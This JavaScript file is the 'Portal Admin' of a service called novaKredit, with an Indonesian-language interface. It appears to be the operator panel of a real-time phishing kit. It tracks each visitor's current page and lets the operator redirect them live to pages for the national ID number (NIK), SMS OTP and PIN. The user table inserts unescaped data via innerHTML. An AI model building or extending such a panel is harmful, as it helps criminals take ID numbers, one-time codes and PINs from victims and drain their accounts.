(() => {
  'use strict';

  if (!window.NovaStorage) {
    console.error('NovaStorage tidak tersedia. Pastikan storage.js dimuat lebih dulu.');
    return;
  }

  const userName = document.getElementById('userName');
  const userStatus = document.getElementById('userStatus');
  const selectedUserName = document.getElementById('selectedUserName');
  const currentPage = document.getElementById('currentPage');
  const targetPage = document.getElementById('targetPage');
  const targetUpdated = document.getElementById('targetUpdated');
  const message = document.getElementById('message');
  const portalButtons = [...document.querySelectorAll('.portal-button')];
  const clearTarget = document.getElementById('clearTarget');
  const refreshUsers = document.getElementById('refreshUsers');
  const refreshPage = document.getElementById('refreshButton');
  const portalStatus = document.getElementById('portalStatus');
  const usersTableBody = document.getElementById('usersTableBody');
  const SYNC_CHANNEL = 'novaKredit-sync';
  const broadcastChannel = typeof BroadcastChannel !== 'undefined' ? new BroadcastChannel(SYNC_CHANNEL) : null;

  let selectedUser = null;
  let remoteUsers = null;

  const getUsers = () => {
    if (Array.isArray(remoteUsers) && remoteUsers.length > 0) return remoteUsers;
    return NovaStorage.getAllUsers();
  };

  const pageLabels = {
    'index.html': 'Halaman Masuk',
    'login': 'Halaman Masuk',
    'form-nik.html': 'Form NIK',
    'form-nik': 'Form NIK',
    'verifikasi-sms.html': 'Halaman OTP',
    'otp': 'Halaman OTP',
    'konfirmasi-pin.html': 'Halaman PIN',
    'pin': 'Halaman PIN'
  };

  const pageName = page => pageLabels[page] || page || '-';
  const formatDate = value => {
    if (!value) return '-';
    return new Date(value).toLocaleString('id-ID', { hour12: false });
  };

  const updateStatus = () => {
    userName.textContent = 'Admin';
    userStatus.textContent = 'Portal Admin';
    selectedUserName.textContent = selectedUser ? selectedUser.username : 'Belum ada';
    currentPage.textContent = selectedUser?.currentPage ? pageName(selectedUser.currentPage) : '-';
    targetPage.textContent = selectedUser?.targetPage ? pageName(selectedUser.targetPage) : '-';
    targetUpdated.textContent = selectedUser?.updatedAt ? `Terakhir diperbarui: ${formatDate(selectedUser.updatedAt)}` : 'Belum ada target halaman';

    const active = Boolean(selectedUser?.targetPage);
    portalStatus.textContent = active ? 'Target aktif' : 'Siap mengirim target';
    portalStatus.classList.toggle('active', active);

    portalButtons.forEach(button => {
      const expectedPage = NovaStorage.getPageByLabel(button.dataset.page);
      button.classList.toggle('active', expectedPage === selectedUser?.targetPage);
    });
  };

  const showMessage = (text, type = '') => {
    if (!message) return;
    message.textContent = text;
    message.className = `message${type ? ` ${type}` : ''}`;
  };

  const selectUser = user => {
    selectedUser = user;
    updateStatus();
    renderUsers();
  };

  const renderUsers = () => {
    const users = getUsers();
    if (!Array.isArray(users) || users.length === 0) {
      usersTableBody.innerHTML = '<tr><td colspan="6">Belum ada user yang terdaftar.</td></tr>';
      selectedUser = null;
      updateStatus();
      return;
    }

    if (!selectedUser || !users.some(user => user.username === selectedUser.username)) {
      selectedUser = users[0];
    }

    usersTableBody.innerHTML = users.map(user => {
      const selectedClass = selectedUser && user.username === selectedUser.username ? 'selected' : '';
      return `
        <tr class="${selectedClass}" data-username="${user.username}">
          <td>${user.username}</td>
          <td>${user.fullName || '-'}</td>
          <td class="status">${user.status || '-'}</td>
          <td>${pageName(user.currentPage)}</td>
          <td>${user.targetPage ? pageName(user.targetPage) : '-'}</td>
          <td>${formatDate(user.updatedAt)}</td>
        </tr>
      `;
    }).join('');

    Array.from(usersTableBody.querySelectorAll('tr[data-username]')).forEach(row => {
      row.addEventListener('click', () => {
        const username = row.dataset.username;
        const found = users.find(user => user.username === username);
        if (found) selectUser(found);
      });
    });

    updateStatus();
  };

  const setTarget = label => {
    if (!selectedUser) {
      showMessage('Pilih user terlebih dahulu.', 'error');
      return;
    }

    const page = NovaStorage.getPageByLabel(label);
    if (!page) {
      showMessage('Target halaman tidak valid.', 'error');
      return;
    }

    const success = NovaStorage.setUserTargetPage(page, selectedUser.username);
    if (!success) {
      showMessage('Gagal menyetel target halaman.', 'error');
      return;
    }

    selectedUser = NovaStorage.getUser(selectedUser.username);
    showMessage(`Target halaman ${pageName(page)} disetel untuk ${selectedUser.username}.`, 'success');
    renderUsers();
  };

  portalButtons.forEach(button => {
    button.addEventListener('click', () => {
      setTarget(button.dataset.page);
      portalButtons.forEach(btn => btn.classList.toggle('active', btn === button));
    });
  });

  clearTarget?.addEventListener('click', () => {
    if (!selectedUser) {
      showMessage('Pilih user terlebih dahulu.', 'error');
      return;
    }

    const success = NovaStorage.clearUserTargetPage(selectedUser.username);
    if (!success) {
      showMessage('Gagal membersihkan target.', 'error');
      return;
    }

    selectedUser = NovaStorage.getUser(selectedUser.username);
    showMessage('Target halaman telah dibersihkan.', 'success');
    renderUsers();
  });

  refreshUsers?.addEventListener('click', () => {
    renderUsers();
    showMessage('Daftar user diperbarui.', 'success');
  });

  refreshPage?.addEventListener('click', () => {
    renderUsers();
    showMessage('Halaman portal disegarkan.', 'success');
  });

  window.addEventListener('storage', event => {
    if (!event.key) return;
    if (['novaKredit.users', 'novaKredit.currentPageVisit'].includes(event.key)) {
      renderUsers();
    }
  });

  if (broadcastChannel) {
    broadcastChannel.addEventListener('message', event => {
      if (!event.data || event.data.type !== 'novaKredit-sync') return;
      renderUsers();
    });
  }

  if (window.NovaStorage?.observeRemoteUsers) {
    NovaStorage.observeRemoteUsers(users => {
      if (!Array.isArray(users)) {
        remoteUsers = Object.values(users || {});
      } else {
        remoteUsers = users;
      }
      renderUsers();
    });
  }

  renderUsers();
})();
